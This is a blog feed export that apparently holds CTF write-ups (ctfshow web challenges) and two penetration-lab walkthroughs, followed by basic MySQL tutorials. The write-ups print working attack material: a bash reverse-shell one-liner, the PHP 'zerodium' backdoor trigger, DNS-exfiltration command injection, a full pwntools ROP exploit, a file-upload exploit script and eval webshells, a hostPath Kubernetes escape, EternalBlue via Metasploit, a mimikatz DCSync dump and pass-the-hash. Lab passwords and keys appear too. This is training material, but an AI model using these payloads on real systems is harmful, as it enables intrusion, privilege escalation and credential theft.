method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;

WEB588吐槽一下：这一题的环境生成的好慢，我还以为环境坏了
Weblogic 任意文件上传漏洞（CVE-2018-2894）利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。
访问IP&#x2F;ws_utc&#x2F;config.do，如果进入时不是设置页面而是登陆页面可以刷新一下多试几次
设置Work Home Dir为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。
然后点击安全 -&gt; 增加，然后上传webshell并找到这个文件的时间戳（可以抓包或F12查看）：
然后访问IP&#x2F;ws_utc&#x2F;css&#x2F;config&#x2F;keystore&#x2F;[时间戳]_[文件名]，即可执行webshell(flag在环境变量里)：
WEB589ActiveMQ任意文件写入漏洞（CVE-2016-3088）
首先访问IP&#x2F;admin&#x2F;test&#x2F;systemProperties.jsp，查看ActiveMQ的绝对路径(账号密码为admin弱口令)：
然后PUT方法上传webshell：上传成功后可以访问看一下，发现代码直接显示了，那么就表示没有解析，需要换个目录
使用MOVE方法移动到web目录下的api文件夹（&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp）中：
WEB590Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。
使用Apereo-CAS-Attack来生成POC然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送
WEB591591后面都是福利题了，嘿嘿Apache HTTPD 换行解析漏洞（CVE-2017-15715）在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A）访问刚才上传的&#x2F;1.php%0a，发现能够成功解析
WEB592Apache HTTPD 多后缀解析漏洞
上传的文件中只要包含.php都能被解析

WEB593Apache SSI 远程命令执行漏洞在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用&lt;!--#exec cmd=&quot;id&quot; --&gt;语法执行任意命令。
上传一个shtml文件访问生成的文件
WEB594Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。EXP运行exp还需要php，python3，linux环境，下载phpggc放在同一级目录下使用时只需要修改exp中的URL和命令即可
WEB595原型为PHP官方GIT服务器近日被植入的后门。首先，后门程序会检测http头是否含有User-Agentt(不是User-Agent，多了一个t)。如果存在，判断它的值是否含有zerodium字符串，作为触发后门的“口令”。如果标示存在，从User-Agentt值的第8个字节起到结尾提取字符串作为代码（前8个字符为zerodium），进行编译执行，如同eval函数效果。抓包改报文即可执行命令：User-Agentt: zerodiumsystem(‘ls &#x2F;‘);
WEB596Python PIL 远程命令执行漏洞（GhostButt ）Python中处理图片的模块PIL（Pillow），因为其内部调用了GhostScript而受到GhostButt漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。
可以看到有一个上传页面。正常功能是我们上传一个PNG文件，后端调用PIL加载图片，输出长宽。但我们可以将可执行命令EPS文件后缀改成PNG进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。
比如poc.png，我们上传之，即可执行touch &#x2F;tmp&#x2F;aaaaa。将POC中的命令改为反弹命令(bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1”)，即可获得shell：
WEB597Ruby On Rails 路径穿越漏洞（CVE-2018-3760）Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。
Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e&#x2F;来跨越到根目录，读取或执行目标服务器上任意文件。
直接访问IP&#x2F;assets&#x2F;file:%2f%2f&#x2F;etc&#x2F;passwd，将会报错，因为文件&#x2F;etc&#x2F;passwd不在允许的目录中：在上方的报错中随意选择一个路径利用..&#x2F;返回上一级，成功实现任意文件读取
WEB598Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）
在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入Accept: ../../../../../../../../etc/passwd&#123;&#123;头来构成构造路径穿越漏洞，读取任意文件。
访问&#x2F;robots并抓包传入Accept
WEB599Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）这一题做的时间比较久，一直反弹不出来，最后向bit师傅学到了一个新的姿势
因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：
# 安装pyftpdlibpip install pyftpdlib# 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口python3 -m pyftpdlib -p 2121 -i 0.0.0.0
然后即可开始利用漏洞。发送如下数据包即可（填上你的FTP服务器的ip和端口，空格要用${IFS}代替，使用前先在dnslog.cn创建一个子域名用来接收数据(替换下面的子域名)）：
IP/download?uri=ftp://FTPIP:FTPPORT/&amp;file=|ping$&#123;IFS&#125;$FLAG.qfy4pq.dnslog.cn$&#123;IFS&#125;-c$&#123;IFS&#125;2观察ftp服务器，收到数据包dnslog收到数据
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow-web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋云境 GreatWall(第一届长城杯半决赛渗透题)</title>
    <url>/posts/f249db01/</url>
    <content><![CDATA[ThinkPHP (172.28.23.17)先扫描端口，发现开放了两个web服务

8080是一个后台登录框，版本是ThinkPHP V5.0.23

直接用tp5的nday打
写入shell后根目录有flag1

然后上传fscan开始扫内网
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:04:4a:03 brd ff:ff:ff:ff:ff:ff    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0       valid_lft 315357428sec preferred_lft 315357428sec    inet6 fe80::216:3eff:fe04:4a03/64 scope link        valid_lft forever preferred_lft forever

发现存活主机如下
172.28.23.26172.28.23.33


第一层内网建立代理通过Neo-reGeorg上传一个tunnel.php
然后本地建立连接，转发到本地的6666端口
python neoreg.py -k dr0n1 -p 6666 -u http://8.130.36.152:8080/tunnel.php
然后使用proxifier或者SwitchyOmega等代理
智联科技 ERP (172.28.23.33)开放了8080端口，访问是 智联科技 ERP 后台登陆
扫下目录
python dirsearch.py -u http://172.28.23.33:8080/ --proxy socks5://127.0.0.1:6666
显然是Shiro框架+heapdump泄露

使用JDumpSpider分析heapdump，拿到ShiroKey
===========================================CookieRememberMeManager(ShiroKey)-------------algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES===========================================


注入内存马后连接shell

没找到flag，用户是ops01，应该是要提权
在&#x2F;home&#x2F;ops01&#x2F;中有HashNote文件，开放了59696端口

分析HashNote文件
首先调用了sub_40501E()进行身份验证，密码为freep@ssw0rd:3
选项1调用了sub_404924()
输入key后调用了sub_40482C()，生成hash作为索引，返回的范围是0-126

因为在重复判断时没有对索引进行验证，存在数组越界

选项2调用了sub_404B7A()
与1同样，没有对索引验证，可以构造data，实现任意地址读

选项3调用了sub_404D2D()
与2一样，输出变成了写入，可以任意地址写

因为username的地址在数组之后，所以越界后数组可以索引到username

先构造两个同样hash不同key的数据
def add(key,data=&#x27;b&#x27;):    p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Key:&#x27;,key)    p.sendlineafter(b&#x27;Data:&#x27;,data)add(b&#x27;\x30&#x27;*1+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;,b&#x27;test&#x27;)add(b&#x27;\x30&#x27;*2+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;,b&#x27;test&#x27;)


然后再username中伪造数据，获取栈的地址
username=0x5dc980stack=0x5e4fa8ukey=b&#x27;\x30&#x27;*5+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;fake_chunk=flat(&#123;    0:username+0x10,    0x10:[username+0x20,len(ukey),\        ukey,0],    0x30:[stack,0x10]    &#125;,filler=b&#x27;\x00&#x27;)


拿到地址后就可以向栈中写入rop链
exp
from pwn import *context.arch=&#x27;amd64&#x27;def add(key,data=&#x27;b&#x27;):    p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Key:&#x27;,key)    p.sendlineafter(b&#x27;Data:&#x27;,data)def show(key):    p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&quot;Key: &quot;,key);def edit(key,data):    p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Key:&#x27;,key)    p.sendlineafter(b&#x27;Data:&#x27;,data)def name(username):    p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;name:&#x27;,username)p = remote(&#x27;172.28.23.33&#x27;, 59696)# p = process(&#x27;./HashNote&#x27;)username=0x5dc980stack=0x5e4fa8ukey=b&#x27;\x30&#x27;*5+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;fake_chunk=flat(&#123;    0:username+0x10,    0x10:[username+0x20,len(ukey),\        ukey,0],    0x30:[stack,0x10]    &#125;,filler=b&#x27;\x00&#x27;)p.sendlineafter(b&#x27;name&#x27;,fake_chunk)p.sendlineafter(b&#x27;word&#x27;,&#x27;freep@ssw0rd:3&#x27;)add(b&#x27;\x30&#x27;*1+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;,b&#x27;test&#x27;)   # 126add(b&#x27;\x30&#x27;*2+b&#x27;\x31&#x27;+b&#x27;\x44&#x27;,b&#x27;test&#x27;)   # 127show(ukey)main_ret=u64(p.read(8))-0x1e0rdi=0x0000000000405e7c # pop rdi ; retrsi=0x000000000040974f # pop rsi ; retrdx=0x000000000053514b # pop rdx ; pop rbx ; retrax=0x00000000004206ba # pop rax ; retsyscall=0x00000000004560c6 # syscallfake_chunk=flat(&#123;    0:username+0x20,    0x20:[username+0x30,len(ukey),\        ukey,0],    0x40:[main_ret,0x100,b&#x27;/bin/sh\x00&#x27;]    &#125;,filler=b&#x27;\x00&#x27;)name(fake_chunk.ljust(0x80,b&#x27;\x00&#x27;))payload=flat([    rdi,username+0x50,    rsi,0,    rdx,0,0,    rax,0x3b,    syscall    ])p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;3&#x27;)p.sendlineafter(b&#x27;Key:&#x27;,ukey)p.sendline(payload)p.sendlineafter(b&#x27;Option:&#x27;,b&#x27;9&#x27;)p.interactive()

在/root/flag_RaYz1/f1ag03.txt拿到flag3

有两张网卡
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:03:cb:48 brd ff:ff:ff:ff:ff:ff    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0       valid_lft 315357178sec preferred_lft 315357178sec    inet6 fe80::216:3eff:fe03:cb48/64 scope link        valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:03:97:b8 brd ff:ff:ff:ff:ff:ff    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1       valid_lft forever preferred_lft forever    inet6 fe80::216:3eff:fe03:97b8/64 scope link        valid_lft forever preferred_lft forever


将fscan传到172.28.23.17后wget下载

172.22.10.1&#x2F;24 网段存活如下
172.22.10.28



新翔OA (172.28.23.26)在之前的扫描结果中看到开放了21端口，匿名用户可以登录
下载oa源码

开始审计代码
从main.php开始，开头引入了db.php和checklogin.php
抽象的鉴权
checklogin.php
&lt;?phpfunction islogin()&#123;   if(isset($_COOKIE[&#x27;id&#x27;])&amp;&amp;isset($_COOKIE[&#x27;loginname&#x27;])&amp;&amp;isset($_COOKIE[&#x27;jueseid&#x27;])&amp;&amp;isset($_COOKIE[&#x27;danweiid&#x27;])&amp;&amp;isset($_COOKIE[&#x27;quanxian&#x27;]))&#123;	   if($_COOKIE[&#x27;id&#x27;]!=&#x27;&#x27;&amp;&amp;$_COOKIE[&#x27;loginname&#x27;]!=&#x27;&#x27;&amp;&amp;$_COOKIE[&#x27;jueseid&#x27;]!=&#x27;&#x27;&amp;&amp;$_COOKIE[&#x27;danweiid&#x27;]!=&#x27;&#x27;&amp;&amp;$_COOKIE[&#x27;quanxian&#x27;]!=&#x27;&#x27;)&#123;	       return true;	   &#125;	    else &#123;	      return false;	   &#125;    &#125;    else &#123;	    return false;     &#125;&#125;?&gt;

Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1 直接登录

登进去后好像没什么用，后台写的很简陋，没有功能点
在源码根目录下还有一个uploadbase64.php
&lt;?php/** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */$img = $_POST[&#x27;imgbase64&#x27;];if (preg_match(&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;, $img, $result)) &#123;    $type = &quot;.&quot;.$result[2];    $path = &quot;upload/&quot; . date(&quot;Y-m-d&quot;) . &quot;-&quot; . uniqid() . $type;&#125;$img =  base64_decode(str_replace($result[1], &#x27;&#x27;, $img));@file_put_contents($path, $img);exit(&#x27;&#123;&quot;src&quot;:&quot;&#x27;.$path.&#x27;&quot;&#125;&#x27;);

对于上传的校验不完整，只要符合格式是data:image/xxx;base64,xxx这种就行了

连上shell后发现有很多disable_functions
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl

用蚁剑自带的插件绕过即可

不过连接前需要修改下.antproxy.php中的$url，加一个/upload
然后就可以执行命令来提权了
执行find / -perm -u=s -type f 2&gt;/dev/null，发现base32有suid权限，可以利用
/bin/fusermount/bin/ping6/bin/mount/bin/su/bin/ping/bin/umount/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/at/usr/bin/staprun/usr/bin/base32/usr/bin/passwd/usr/bin/chsh/usr/bin/sudo/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/s-nail/s-nail-privsep


查看网卡情况
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:01:54:82 brd ff:ff:ff:ff:ff:ff    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 fe80::216:3eff:fe01:5482/64 scope link        valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:01:a4:5e brd ff:ff:ff:ff:ff:ff    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1       valid_lft forever preferred_lft forever    inet6 fe80::216:3eff:fe01:a45e/64 scope link        valid_lft forever preferred_lft forever


同样的wget下载fscan
http://172.28.23.26/upload/.antproxy.php?a=system(&quot;wget http://172.28.23.17:8080/fscan&quot;);
然后反弹到thinkphp里执行

172.22.14.1&#x2F;24 网段存活如下
172.22.14.37172.22.14.46



第二层内网建立代理使用Stowaway将内网主机多层代理出来
1：vps上作为管理端./linux_x64_admin -l 2223 -s 2223
2：ThinkPHP (172.28.23.17) 作为跳板./linux_x64_agent -c 47.99.77.52:2223 -s 2223 --reconnect 8
3：控制端监听端口
(admin) &gt;&gt; use 0(node 0) &gt;&gt; listen[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you&#x27;re controlling was started in the corresponding way![*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port![*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1[*] Please input the [ip:]&lt;port&gt; : 8889[*] Waiting for response......[*] Node is listening on 8889

4：新翔OA (172.28.23.26)连接到ThinkPHP (172.28.23.17)./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8
5：然后就可以建立socks代理了
(node 0) &gt;&gt; socks 7878[*] Trying to listen on 0.0.0.0:7878......[*] Waiting for agent&#x27;s response......[*] Socks start successfully!


Harbor (172.22.14.46)尝试打harbor未授权

下载secret镜像
python harbor.py http://172.22.14.46/ --dump harbor/secret -v2
得到flag5

DooTask (172.22.10.28)下载projectadmin镜像
python harbor.py http://172.22.14.46/ --dump project/projectadmin -v2
run.sh
#!/bin/bashsleep 1# startjava -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar/usr/bin/tail -f /dev/null

找到ProjectAdmin-0.0.1-SNAPSHOT.jar然后反编译
泄露了数据库账号密码
spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTCspring.datasource.username=rootspring.datasource.password=My3q1i4oZkJm3spring.datasource.driver-class-name=com.mysql.cj.jdbc.Drivermybatis.type-aliases-package=com.smartlink.projectadmin.entitymybatis.mapper-locations=classpath:mybatis/mapper/*.xml


直接用MDUT一把梭

k8s (172.22.14.37)fscan扫到了10250端口，这个端口有个k8s kubelet 10250端口未授权，但是不符合利用条件
尝试另一个6443端口的Api Server未授权

编辑恶意yaml
apiVersion: apps/v1kind: Deploymentmetadata:  name: nginx-deployment  labels:    app: nginxspec:  replicas: 1  selector:    matchLabels:      app: nginx  template:    metadata:      labels:        app: nginx    spec:      containers:      - name: nginx        image: nginx:1.8        volumeMounts:        - mountPath: /mnt          name: test-volume      volumes:      - name: test-volume        hostPath:          path: /

创建pod
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil.yaml
列出pod
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default

进容器
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash
写公钥
echo &quot;ssh-rsa xxxx&quot; &gt; /mnt/root/.ssh/authorized_keys
ssh连接，在数据库中得到flag


拓扑图大概绘制的拓扑图

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>春秋云境</tag>
        <tag>多维挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋云境 Initial</title>
    <url>/posts/5a3650d1/</url>
    <content><![CDATA[开始签到白嫖打完所有靶机计划!

Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。

前置知识:
内网渗透学习(代理篇)内网渗透学习(横向移动篇)linux提权笔记
入口（172.22.1.15）根据报错信息得知是ThinkPHP 5，存在nday，可以getshell

写马后查看用户是 www-data 尝试sudo提权

发现mysql有权限，在gtfobins查询得到命令sudo mysql -e &#39;\! /bin/sh&#39;

得到flag1：flag01: flag&#123;60b53231-
内网查看入口主机IP是 172.22.1.15

上传fscan扫C段

一共三台主机，信呼OA，存在ms17-010的windows和一台DC域控
上传iox构建socks代理
./iox proxy -l 6666


信呼OA（172.22.1.18）存在弱口令使用admin/admin123登录
版本是v2.2.8，有文件上传漏洞
先在脚本同目录放一个1.php
&lt;?=eval($_POST[1]);?&gt;

exp，注意几个传参
import requestssession = requests.session()url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;&#125;r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;id = r.json()[&#x27;id&#x27;]print(id)print(filepath)url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)

成功上传shell

得到flag2：flag02: 2ce3-4813-87d4-


另一种打法
这台机子还部署了phpmyadmin

恰好root/root弱口令可以登录
查看目录
select @@basedir;


查看是否开启日志以及存放的日志位置
show variables like &#x27;general%&#x27;;


开启日志
set global general_log = ON;

设置日志保存位置
set global general_log_file = &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;


写入shell
select &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;;

getshell

DC（172.22.1.2）fscan扫出来有ms17-010，直接用msfconsole打
proxychains4 msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21exploit


加载mimikatz(kiwi就是msf内置的mimikatz模块的升级版)通过DCSync导出域内哈希
load kiwikiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit


抓到了Administrator的hash，加上之前扫出来 DC(172.22.1.2) 的 445 端口是开放的，可以利用 smb 哈希传递拿下域控制器
使用 crackmapexec 来进行PTH
proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;


得到flag3：flag03: e8f88d0d43d6&#125;
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>春秋云境</tag>
        <tag>专业徽章</tag>
        <tag>DCSync</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（一）</title>
    <url>/posts/44d403a0/</url>
    <content><![CDATA[环境centos7，mariadb5.5.56
数据库基础操作查看数据库默认有四个库
MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || test               |+--------------------+4 rows in set (0.00 sec)
创建数据库aab是数据库的名字
MariaDB [(none)]&gt; create database aab;Query OK, 1 row affected (0.00 sec)

切换（使用）数据库切换至aab数据库
MariaDB [(none)]&gt; use aab;Database changedMariaDB [aab]&gt;

删除（丢弃）数据库drop database [if exists] 数据库名;if exists 为可选，判断是否存在，如果不存在则会抛出异常
MariaDB [(none)]&gt; drop database if exists aab;Query OK, 0 rows affected (0.00 sec)

表基础操作查看表因为目前还没有表，所以返回了empty set
MariaDB [aab]&gt; show tables;Empty set (0.00 sec)

创建表create table 表格名(列名1 类型，列名2 类型，列名3 类型);
MariaDB [aab]&gt; create table bba(Sid int,Sname char(6),Sdate date);Query OK, 0 rows affected (0.00 sec)
扩展—常用数据类型

整数型：tinyint, smallint, mediumint, int, bigint小数型：float, double, decimal, real字符型：char, varchar日期时间型： date, datetime, time, timestamp, year备注型：tinytext, text, mediumtext, longtext

扩展—char与varchar的区别

首先明确的是，char的长度是不可变的，而varchar的长度是可变的，定义一个char[10]和varchar[10],如果存进去的是‘abcd’,那么char所占的长度依然为10，除了字符‘abcd’外，后面跟六个空格，而varchar就立马把长度变为4了，取数据的时候，char类型的要用trim()去掉多余的空格，而varchar是不需要的。


char的存取数度还是要比varchar要快得多，因为其长度固定，方便程序的存储与查找；但是char也为此付出的是空间的代价，因为其长度固定，所以难免会有多余的空格占位符占据空间，可谓是以空间换取时间效率，而varchar是以空间效率为首位的。char的存储方式是，对英文字符（ASCII）占用1个字节，对一个汉字占用两个字节；而varchar的存储方式是，对每个英文字符占用2个字节，汉字也占用2个字节，两者的存储数据都非unicode的字符数据。

查看表结构show columns from 表名;
MariaDB [aab]&gt; show columns from bba;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| Sid   | int(11) | YES  |     | NULL    |       || Sname | char(6) | YES  |     | NULL    |       || Sdate | date    | YES  |     | NULL    |       |+-------+---------+------+-----+---------+-------+3 rows in set (0.00 sec)

删除表drop table [if exists] 表名;if exists 为可选，判断是否存在，如果不存在则会抛出异常

注意：删除具有主外键关系的表时，要先删子表(从表)，后删主表

MariaDB [aab]&gt; drop table bba;Query OK, 0 rows affected (0.00 sec)
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（三）</title>
    <url>/posts/39dc4c2a/</url>
    <content><![CDATA[添加数据INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN );

如果数据是字符型，必须使用单引号或者双引号，如：”value”。

删除数据删除ttt表中id等于1的数据
delete from ttt where id=1;

插入字段
alter table [表格名] Add column [要添加的字段] [字段类型] AFTER [哪个字段后面加];

在Password后插入一个char(8)类型的host字段
插入字段并判断有效值
CHECK约束就是当向表中插入一行或更新一行数据时进行CHECK约束检查，CHECK接受一个表达式，如果这个表达式为TRUE则允许插入，如果这个表达式为FALSE则拒绝插入，在MariaDB10.2版本才开始支持CHECK。


alter table [表格名] add [要添加的字段] [字段类型] [check约束] after [哪个字段后面加];

要满足条件age&#x3D;21或22才允许插入alter table userinfo add age int check(age=21 or age=22) after name;
删除字段
alter table [表格名] drop column [要删除的字段名];

更新数据
update [表格名] set [修改的内容] where [条件];

中文数据支持（修改编码格式）正常插入一条中文数据会显示不出来，因为默认编码是latin1
查看数据库默认编码show variables like &#39;char%&#39;;
查看指定数据库默认编码show create database [数据库];
创建数据库指定字符集create database [数据库名称] character set utf8;
创建表指定字符集create table [表名和字段] charset=utf8; 
导入导出库和表导出数据库和表导出aaa库，以aaa.sql为文件名保存
mysqldump -u root -p123 aaa &gt; aaa.sql

导出aaa.ttt表，以ttt.sql为文件名保存
mysqldump -u root -p123 aaa ttt &gt; ttt.sql

导入数据库和表导入aaa这个数据库注意要先创建一个aaa库
mysqldump -u root -p123 aaa &lt; aaa.sql

导入ttt表
MariaDB [(none)]&gt; use aaa;                      //进入数据库MariaDB [aaa]&gt; source /root/ttt.sql           //导入sql
导入txt表结构
MariaDB [test]&gt; desc sj;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| ID       | int(11)     | NO   | PRI | NULL    |       || Name     | varchar(10) | YES  |     | NULL    |       || Day      | date        | YES  |     | NULL    |       || Password | varchar(16) | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+4 rows in set (0.00 sec)

sql.txt内容
[root@localhost ~]# cat sql.txt3,张三,2000-01-02,zhangsan4,李四,2001-06-15,123456

表中已有内容
MariaDB [test]&gt; select * from sj;+----+--------+------------+------------------+| ID | Name   | Day        | Password         |+----+--------+------------+------------------+|  1 | w      | 1999-11-07 | f1290186a5d0b1ce ||  2 | 二哈   | 1996-12-01 | 49973c3a8ab362ad |+----+--------+------------+------------------+2 rows in set (0.00 sec)

导入txt
